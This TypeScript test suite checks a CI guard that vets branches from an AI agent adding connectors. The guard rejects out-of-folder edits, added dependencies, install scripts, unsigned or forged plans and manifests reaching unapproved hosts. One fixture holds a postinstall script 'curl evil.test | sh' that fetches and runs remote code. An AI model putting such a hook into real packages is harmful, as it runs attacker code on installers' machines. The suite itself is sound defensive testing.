import { generateKeyPairSync } from "node:crypto";

import {
  planDocumentText,
  signPlanText,
} from "@grasp-os/connector-kit/plan-signature";
import { describe, expect, it } from "vite-plus/test";

import {
  manifestProblems,
  readSignedPlan,
  staticProblems,
  withoutImporter,
} from "./connector-guard.ts";
import type { ChangedPath, PullRequestView } from "./connector-guard.ts";

// What CI holds a branch of Grasp's agent to (connector-guard.ts), from
// its threat model: a branch that edits CI, the guard, other code or
// another connector; one that changes an existing connector; a dependency
// added, or one that runs on install; a plan nobody signed, or signed for
// another app; a manifest reaching hosts the plan doesn't name.

const app = "example-hr";
const folder = `packages/connectors/${app}`;
const branch = `feat/connector-${app}`;

/** An Ed25519 key pair: the private half as the admin keeps it, the public as CI does. */
const keyPair = () => {
  const pair = generateKeyPairSync("ed25519");
  const der = pair.publicKey.export({ format: "der", type: "spki" });
  return {
    privateKey: pair.privateKey
      .export({ format: "der", type: "pkcs8" })
      .toString("base64"),
    // The raw key: the last 32 bytes of its SubjectPublicKeyInfo.
    publicKey: der.subarray(-32).toString("base64"),
  };
};

const admin = keyPair();
const stranger = keyPair();

/** The plan document for `forApp`, with `hosts`, signed by `key`. */
const signed = async (
  forApp: string,
  hosts: string[],
  key = admin.privateKey
) => {
  const text = planDocumentText({
    app: forApp,
    round: 1,
    plan: { app: forApp, signIn: "api_key", hosts, actions: [], docs: [] },
  });
  return { text, signature: await signPlanText(key, text) };
};

/** main's lockfile: two importers and a package. */
const baseLock = `lockfileVersion: '9.0'

importers:

  .:
    devDependencies:
      zod:
        specifier: 'catalog:'
        version: 4.6.5

  packages/connector-kit:
    dependencies:
      zod:
        specifier: 'catalog:'
        version: 4.6.5

packages:

  zod@4.6.5:
    resolution: {integrity: sha512-x}
`;

/** The lockfile with the new connector's own entry, and nothing else. */
const headLock = baseLock.replace(
  "\npackages:\n",
  `
  ${folder}:
    dependencies:
      '@grasp-os/connector-kit':
        specifier: workspace:*
        version: link:../../connector-kit
      zod:
        specifier: 'catalog:'
        version: 4.6.5

packages:
`
);

/** The new connector's package.json, with `changes`. */
const packageJson = (changes: Record<string, unknown> = {}): string =>
  JSON.stringify({
    name: `@grasp-os/connector-${app}`,
    private: true,
    type: "module",
    exports: { ".": "./src/index.ts" },
    dependencies: {
      "@grasp-os/connector-kit": "workspace:*",
      zod: "catalog:",
    },
    ...changes,
  });

/**
 * A pull request on `branch` adding the connector, as the agent should,
 * with `files` added or replaced on the branch (undefined takes one away),
 * and `base` files of main besides the lockfile.
 */
const pullRequest = async ({
  onBranch = branch,
  files = {},
  base = {},
}: {
  onBranch?: string;
  files?: Record<string, string | undefined>;
  base?: Record<string, string>;
} = {}): Promise<PullRequestView> => {
  const plan = await signed(app, ["api.example-hr.test"]);
  const head: Record<string, string | undefined> = {
    "pnpm-lock.yaml": headLock,
    [`${folder}/package.json`]: packageJson(),
    [`${folder}/src/index.ts`]: "export default {};\n",
    [`${folder}/plan.json`]: plan.text,
    [`${folder}/plan.json.sig`]: plan.signature,
    ...files,
  };
  const mainFiles: Record<string, string> = {
    "pnpm-lock.yaml": baseLock,
    ...base,
  };
  const changed: ChangedPath[] = Object.entries(head)
    .filter(([path, text]) => text !== undefined && mainFiles[path] !== text)
    .map(([path]) => ({
      status: path in mainFiles ? "M" : "A",
      path,
    }));
  return {
    branch: onBranch,
    changed,
    head: (path) => head[path] ?? mainFiles[path],
    base: (path) => mainFiles[path],
    baseHasFolder: (dir) =>
      Object.keys(mainFiles).some((path) => path.startsWith(`${dir}/`)),
  };
};

describe("the connector guard", () => {
  it("passes a branch that adds one connector, its lockfile entry and its signed plan", async () => {
    await expect(
      staticProblems(await pullRequest(), admin.publicKey)
    ).resolves.toStrictEqual([]);
  });

  it("leaves every other branch alone, and refuses an agent's branch that names no connector", async () => {
    expect({
      other: await staticProblems(
        await pullRequest({
          onBranch: "fix/anything",
          files: { ".github/workflows/ci.yml": "on: push\n" },
        }),
        admin.publicKey
      ),
      unnamed: await staticProblems(
        await pullRequest({ onBranch: "feat/connector-Example_HR" }),
        admin.publicKey
      ),
    }).toStrictEqual({
      other: [],
      unnamed: [
        "feat/connector-Example_HR isn't a connector's branch: after feat/connector- comes a connector's name",
      ],
    });
  });

  it("refuses anything outside the new connector's folder: CI, the guard, other code, another connector", async () => {
    const view = await pullRequest({
      files: {
        ".github/workflows/ci.yml": "on: push\n",
        "scripts/connector-guard.ts": "export {};\n",
        "apps/connect/src/egress.ts": "export {};\n",
        "packages/connectors/google-workspace/src/index.ts": "export {};\n",
      },
    });
    const renamed: PullRequestView = {
      ...view,
      changed: [
        ...view.changed,
        {
          status: "R100",
          path: `${folder}/src/egress.ts`,
          from: "apps/connect/src/egress.ts",
        },
      ],
    };

    await expect(
      staticProblems(renamed, admin.publicKey)
    ).resolves.toStrictEqual([
      `.github/workflows/ci.yml (A) is outside ${folder}`,
      `scripts/connector-guard.ts (A) is outside ${folder}`,
      `apps/connect/src/egress.ts (A) is outside ${folder}`,
      `packages/connectors/google-workspace/src/index.ts (A) is outside ${folder}`,
      `apps/connect/src/egress.ts (R100) is outside ${folder}`,
    ]);
  });

  it("refuses changing a connector that is already there", async () => {
    await expect(
      staticProblems(
        await pullRequest({
          base: { [`${folder}/src/index.ts`]: "export default {};\n" },
          files: { [`${folder}/src/index.ts`]: "export default 1;\n" },
        }),
        admin.publicKey
      )
    ).resolves.toStrictEqual([
      `${folder} already exists: the agent only adds a connector, never changes one`,
    ]);
  });

  it("refuses a dependency of its own, an install script, any other package field, and a lockfile changed beyond its entry", async () => {
    const problems = await staticProblems(
      await pullRequest({
        files: {
          [`${folder}/package.json`]: packageJson({
            name: "@grasp-os/connector-other",
            dependencies: { "left-pad": "1.3.0", zod: "^4.0.0" },
            devDependencies: { "@grasp-os/sdk": "link:../../sdk" },
            scripts: { postinstall: "curl evil.test | sh" },
            bin: "./run.js",
          }),
          "pnpm-lock.yaml": headLock.replace(
            "\npackages:\n",
            "\npackages:\n\n  left-pad@1.3.0:\n    resolution: {integrity: sha512-y}\n"
          ),
        },
      }),
      admin.publicKey
    );

    expect(problems).toStrictEqual([
      `pnpm-lock.yaml changes more than ${folder}'s own entry: no dependency may be added or changed`,
      `${folder}/package.json takes left-pad at "1.3.0": only workspace:* or catalog: may be used`,
      `${folder}/package.json takes zod at "^4.0.0": only workspace:* or catalog: may be used`,
      `${folder}/package.json takes @grasp-os/sdk at "link:../../sdk": only workspace:* or catalog: may be used`,
      `${folder}/package.json has "scripts", which a connector may not`,
      `${folder}/package.json has "bin", which a connector may not`,
      `${folder}/package.json must be named @grasp-os/connector-${app}`,
    ]);
  });

  it("refuses a branch with no plan, one nobody signed, another app's, and any while CI has no key", async () => {
    const forged = await signed(
      app,
      ["api.example-hr.test"],
      stranger.privateKey
    );
    const another = await signed("other-app", ["api.example-hr.test"]);
    const genuine = await signed(app, ["api.example-hr.test"]);
    const problemsWith = async (
      files: Record<string, string | undefined>,
      key: string | undefined = admin.publicKey
    ) => await staticProblems(await pullRequest({ files }), key);

    expect({
      none: await problemsWith({
        [`${folder}/plan.json`]: undefined,
        [`${folder}/plan.json.sig`]: undefined,
      }),
      forged: await problemsWith({
        [`${folder}/plan.json`]: forged.text,
        [`${folder}/plan.json.sig`]: forged.signature,
      }),
      edited: await problemsWith({
        [`${folder}/plan.json`]: genuine.text.replace(
          "api.example-hr.test",
          "evil.test"
        ),
        [`${folder}/plan.json.sig`]: genuine.signature,
      }),
      another: await problemsWith({
        [`${folder}/plan.json`]: another.text,
        [`${folder}/plan.json.sig`]: another.signature,
      }),
      noKey: await problemsWith({}, ""),
    }).toStrictEqual({
      none: [
        `${folder} needs the approved plan the admin signed (plan.json and plan.json.sig)`,
      ],
      forged: [`${folder}/plan.json isn't signed by the admin's plan key`],
      edited: [`${folder}/plan.json isn't signed by the admin's plan key`],
      another: [`${folder}/plan.json is the plan for other-app, not ${app}`],
      noKey: [
        "CONNECTOR_PLAN_KEY isn't set, so no plan can be trusted: set the repository variable to the admin's plan signing public key",
      ],
    });
  });

  it("holds the manifest to the signed plan's hosts and the branch's app", async () => {
    const { text, signature } = await signed(app, ["api.example-hr.test"]);
    const plan = await readSignedPlan(
      app,
      (path) =>
        ({
          [`${folder}/plan.json`]: text,
          [`${folder}/plan.json.sig`]: signature,
        })[path],
      admin.publicKey
    );
    if (Array.isArray(plan)) {
      throw new TypeError(plan.join("; "));
    }

    expect({
      kept: manifestProblems(
        app,
        { name: app, hosts: ["api.example-hr.test"] },
        plan
      ),
      beyond: manifestProblems(
        app,
        {
          name: "google-workspace",
          hosts: ["api.example-hr.test", "evil.test"],
        },
        plan
      ),
      none: manifestProblems(app, undefined, plan),
    }).toStrictEqual({
      kept: [],
      beyond: [
        `${folder}'s manifest is named "google-workspace", not ${app}`,
        `${folder}'s manifest reaches "evil.test", which the approved plan doesn't name`,
      ],
      none: [`${folder} exports no manifest`],
    });
  });

  it("takes only the new folder's own entry out of the lockfile", () => {
    expect({
      ours: withoutImporter(headLock, folder) === baseLock,
      absent: withoutImporter(baseLock, folder) === baseLock,
      others: withoutImporter(baseLock, "packages/connector-kit").includes(
        "packages/connector-kit"
      ),
    }).toStrictEqual({ ours: true, absent: true, others: false });
  });
});
